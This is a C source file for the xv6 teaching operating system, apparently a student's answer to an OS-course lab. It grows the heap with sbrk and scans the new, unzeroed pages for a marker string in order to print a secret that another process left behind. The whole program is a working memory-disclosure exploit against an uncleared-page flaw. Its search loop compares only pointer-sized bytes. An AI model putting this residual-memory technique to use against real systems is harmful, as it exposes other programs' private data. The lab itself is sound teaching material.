/**
 * NOTICE: not every time system will parse correct secret, hacker should also
 * consider page table split and other app's interference(they will use memory
 * too!), so sometimes this app will parse out unexpected result.
 */
#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define ATTACK_DATASIZE PGSIZE
char data[ATTACK_DATASIZE];
const char *secret_pattern = "This may help.";
// for faster search speed, this can be upgrade to Boyer-Moore algorithm.
// but for practice, we just use sliding window is enough.
char *
search_secret(char *buf, int buf_size) {

  for (int i = 0; i < buf_size - sizeof((void *)secret_pattern); i++) {
    if (memcmp(buf, secret_pattern, sizeof((void *)secret_pattern)) == 0) {
      // printf("search success!\n");
      return buf;
    }
    buf++;
  }
  return (char *)0;
}

// We use "This may help." as a memory coordination to crack what is in secret.
// But actually, "This may help." exist in both .rodata(putting the raw string)
// and .data(char data[DATASIZE];), so we need to evaulate whether the secret is
// real or not.
int
secret_judge(char *secret_buf, int max_len) {
  if (strlen(secret_buf) == 0 || strcmp(secret_buf, "(null)") == 0) {
    // printf("fake message!\n");
    return 0;
  }
  printf("%s\n", secret_buf); // this is the answer!
  return 1;
}
int
main(int argc, char *argv[])
{
  // Your code here.
  char *start_addr;
  char *secret_addr = (char *)0;
  // int secret_maxlen;
  while (1) {
    start_addr = sbrk(sizeof(data));
    if (start_addr == SBRK_ERROR) {
      printf("attack: sbrk failed\n");
      break;
    }
    memmove(data, start_addr, sizeof(data)); // protection, avoid heap overflow
    secret_addr = search_secret(data, sizeof(data));
    if (secret_addr != (char *)0) {
      // printf("%s\n", secret_addr); // should show "This may help."
      secret_addr += 16;
      if (secret_judge(secret_addr, ATTACK_DATASIZE - (secret_addr - data)))
        break;
    }
  }
  exit(0);
}
